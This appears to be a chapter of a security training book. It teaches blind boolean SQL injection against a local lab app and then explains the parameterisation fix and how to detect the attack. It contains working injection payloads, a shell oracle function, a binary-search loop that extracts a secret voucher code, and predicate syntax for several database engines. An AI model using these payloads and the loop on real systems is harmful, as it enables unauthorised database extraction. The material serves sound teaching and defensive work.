# Lab 13 — Waitlist

## What "blind" means

The injection is the same concatenation as Lab 12. What changed is the output:
the application returns one boolean and the same HTTP 200 whether your query
returned rows, returned nothing, or failed to parse. There is nothing to union
into.

So you stop trying to make the database *print* the answer and start making it
*answer yes-or-no questions about* the answer.

## Step 1 — establish the oracle

You need two payloads that are identical except for their truth value, and a
signal that separates them.

```bash
h5i browser open 'http://127.0.0.1:9130/api/check?email=ada@example.test' \
    --session lab13 --new --capture

h5i websec replay req_0 --session lab13 --set "query.email=zz' OR (1=1) -- "   # {"on_list":true}
h5i websec replay req_0 --session lab13 --set "query.email=zz' OR (1=2) -- "   # {"on_list":false}
```

`zz'` makes the original condition false, so the whole answer is your injected
predicate.

**Read the signal off the replay reply, not the body.** `response.bytes` is 17
for `true` and 18 for `false`. On a real target the separating signal might be
the status, the length, a redirect, or one word in a 40 KB page — find it once,
then never fetch a body again in the loop:

```bash
ask() {
  h5i websec replay req_0 --session lab13 --reset-budget --set "query.email=zz' OR ($1) -- " |
    python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["bytes"])'
}
```

## Step 2 — spend your bits well

A naive extraction asks "is character 1 an `a`? a `b`? a `c`?" — up to 95
requests per character. A binary search on the character's code point asks 7.
For a 24-character secret that is 168 requests instead of 2,280.

```
      unicode(substr(code, i, 1)) > 79 ?
                yes → 80..126        no → 32..79
```

```bash
lo=32; hi=126
while [ $lo -lt $hi ]; do
  mid=$(( (lo+hi)/2 ))
  if [ "$(ask "(SELECT unicode(substr(code,$i,1)) FROM vouchers) > $mid")" = "$TRUE" ]
    then lo=$((mid+1)); else hi=$mid; fi
done
```

Get the length first (`(SELECT length(code) FROM vouchers) < $i`) so the loop
knows when to stop rather than reading padding.

If you can spend more per request, ask about a *bit* of the character instead
and pack several predicates into one query — but binary search is the right
default: simple, engine-portable, and 7 requests a character.

## Step 3 — do not forget `--reset-budget`

A few hundred replays will exhaust the page's network allowance partway
through, and every subsequent answer will read as `false`. In a blind
extraction that does not look like an error; it looks like the secret ending.
See Lab 06.

## Engine-portable predicates

| Need | SQLite | MySQL | PostgreSQL | MSSQL |
| --- | --- | --- | --- | --- |
| substring | `substr(s,i,1)` | `substring(s,i,1)` | `substr(s,i,1)` | `substring(s,i,1)` |
| char → int | `unicode(c)` | `ascii(c)` | `ascii(c)` | `unicode(c)` |
| length | `length(s)` | `length(s)` | `length(s)` | `len(s)` |
| comment | `-- ` | `-- ` or `#` | `-- ` | `-- ` |

## The fix

Same as Lab 12: parameterise. Note that hiding the error message did *not* fix
anything here — it only changed the extraction from one request to seven per
character. **Blindness is not a mitigation.** It is a rate limit, and an
attacker's script does not get tired.

What does help alongside the real fix: rate limits and anomaly detection on a
single endpoint receiving hundreds of near-identical requests, which is exactly
what this loop looks like in a log.

## h5i technique

Reading `response.bytes` / `response.status` out of the `replay` reply is the
core loop of every blind technique in this book. The reply is JSON by default
precisely so that a loop can branch on it without parsing prose.
